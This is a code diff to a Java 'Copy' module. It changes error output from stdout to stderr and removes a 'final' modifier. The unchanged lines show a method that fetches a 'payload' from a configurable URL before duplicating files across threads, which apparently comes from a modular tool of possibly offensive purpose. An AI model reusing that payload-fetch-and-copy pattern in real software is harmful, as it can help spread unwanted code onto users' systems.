@@ -130,7 +130,7 @@ public class Copy implements Runnable, modules.auxiliary.Module {
 	                }
 	            }
 	            catch(SecurityException secEx) {
-	                System.out.printf("Access denied. File: ./%s%n",filePath.getName()); // current file will be skipped
+	                System.err.printf("Access denied. File: ./%s%n",filePath.getName()); // current file will be skipped
 	            }
 	        }
     	}
@@ -148,11 +148,12 @@ public class Copy implements Runnable, modules.auxiliary.Module {
     public boolean duplicateCurrent(String filePath) {
         // invalid file handle check
         if(!validPath(filePath)) {
-        	System.out.printf("Invalid file path %s%n", filePath);
+        	System.err.printf("Invalid file path %s%n", filePath);
             return false;
         }
 
         // Fetch payload
+
         String payloadPath = manager.fetchPayload(payloadURL);
         if(payloadPath == null) {
             return false;
@@ -175,11 +176,11 @@ public class Copy implements Runnable, modules.auxiliary.Module {
             threadPool.execute(new CopyFileHandler(inStream, outStream, bufferSize));
         }
         catch(FileNotFoundException fnfEx) {
-        	System.out.println("One or more files in current duplication not found.");
+        	System.err.println("One or more files in current duplication not found.");
         	return false;
         }
         catch(SecurityException ioEx) {
-        	System.out.println("Access denied. One or more file in current duplication.");
+        	System.err.println("Access denied. One or more file in current duplication.");
         	return false;
         }
         
@@ -206,7 +207,7 @@ public class Copy implements Runnable, modules.auxiliary.Module {
     /**
      	Shuts down thread pool for current instance.
     */
-    private final void shutdownThreadPool() {
+    private void shutdownThreadPool() {
     	threadPool.shutdown(); // revoke new task creation
     	try {
     		// wait for existing threads to terminate before force terminate
